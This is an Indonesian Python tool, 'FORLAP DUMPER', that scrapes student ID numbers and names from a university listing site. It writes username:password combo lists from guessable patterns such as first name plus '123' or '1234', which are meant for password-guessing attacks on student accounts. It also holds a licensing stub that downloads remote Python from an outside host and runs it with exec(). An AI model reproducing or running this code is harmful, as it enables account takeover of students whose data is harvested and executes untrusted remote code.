import requests as req
import os, json, hashlib, sys
from bs4 import BeautifulSoup as bs
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[41;39m'
bold = '\033[1m'
normal = '\033[0m'
off = '\x1b[m'

bn = (f"{blue}   ________  ___  __   ___   ___ \n{purple}  / __/ __ \/ _ \/ /  / _ | / _ \{cyan}\n / _// /_/ / , _/ /__/ __ |/ ___/\n{white}/_/  \____/_/|_/____/_/ |_/_/    ")                   

'''
 
 DO NOT RESELL FOR RESPECT
 MAKING THIS TOOL IS VERY DIFFICULT
 
'''

yxc = []
def main():
	os.system('clear')
	print(bn)
	print(f"{flag}       FORLAP DUMPER DECODE      {off}")
	print()
	print(f"{purple}[{yellow}1{purple}]{off}nim:Namber+angka\n{purple}[{yellow}2{purple}]{off}nim:namcil+angka \n")
	_0 = input(f"{green}[{red}?{green}]{white}Pilih > ")
	_1 = cut(input(f"\n{red}[{yellow}!{red}]{off}Ambil link dari tahun Smester\n\n{off}[{green}+{off}]{green}Input Link {off}> "))
	print()
	_2 = input(f"{off}[{green}+{off}]{green}Nama Output (nama + .txt) {off}> ")
	_3 = stat(_1)
	if _0 == '#':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			with open(_2,'a') as o_:
				o_.write(__+'\n')
		done(_2)
	elif _0 == '@':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			with open(_2,'a') as o_:
				o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == '1':
		print(f'\n{green}[{white}✓{green}]{white}Total halaman : {green}{_3}{off}\n')
		for _ in range(int(_3)):
			print(f"{cyan}>> {yellow}Grabbing page ke {white}: {_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].title()+'123\n')
					o_.write(__+':'+x[0].title()+'1234\n')
					o_.write(__+':'+x[0].title()+'12345\n')
					o_.write(__+':'+x[0].title()+'098\n')
					o_.write(__+':'+x[0].title()+'321\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+___.title()+'\n')
		done(_2)
	elif _0 == '2':
		print(f'\n{green}[{white}✓{green}]{white}Total halaman : {green}{_3}{off}\n')
		for _ in range(int(_3)):
			print(f"{cyan}>> {yellow}Grabbing page ke {white}: {_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].lower()+'123\n')
					o_.write(__+':'+x[0].lower()+'1234\n')
					o_.write(__+':'+x[0].lower()+'12345\n')
					o_.write(__+':'+x[0].lower()+'098\n')
					o_.write(__+':'+x[0].lower()+'321\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+___.lower()+'\n')
		done(_2)
	elif _0 == '$':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(x[0].title()+':'+__+'\n')
					#o_.write(x[1].title()+':'+__+'\n')
					o_.write(x[0].lower()+':'+ __+'\n')
					o_.write(x[1].lower()+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					#o_.write(___+':'+__.title()+'\n')
					o_.write(___+':'+__.lower()+'\n')
		done(_2)
	elif _0 == '&':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(x[0].title()+':'+x[0].title()+'\n')
					#o_.write(x[1].title()+':'+x[1].title()+'\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'\n')
					o_.write(x[1].lower()+':'+x[1].lower()+'\n')
			except:
				with open(_2,'a') as o_:
					#o_.write(___+':'+___.title()+'\n')
					o_.write(___+':'+___.lower()+'\n')
		done(_2)
	elif _0 == '*':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(x[0].title()+':'+x[0].title()+'123\n')
					#o_.write(x[1].title()+':'+x[1].title()+'123\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'123\n')
					o_.write(x[1].lower()+':'+x[1].lower()+'123\n')
			except:
				with open(_2,'a') as o_:
					#o_.write(___+':'+___.title()+'123\n')
					o_.write(___+':'+___.lower()+'123\n')
		done(_2)
	else:
		exit()

def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

def done(_2):
	print(f"\n{green}[{purple}✓{green}]{cyan}{len(yxc)} {off}Hasil tersimpan di{green} '{_2}'{off}")

def start():
	_ = os.popen('getprop ro.build.id').read().replace('\n','')
	_ = hashlib.md5(_.encode()).hexdigest()[:15]
	o = req.get(f'https://yutixcode.xyz/akses/fdp/{_}',verify=False).status_code
	if o == 200:
		main()
	else:
		o_o = req.get('https://yutixcode.xyz/akses/fdp/fake-anjing.py',verify=False).text
		with open('ewe','w') as crot:
			crot.write(o_o)
		exec(o_o)

if __name__=='__main__':
	main()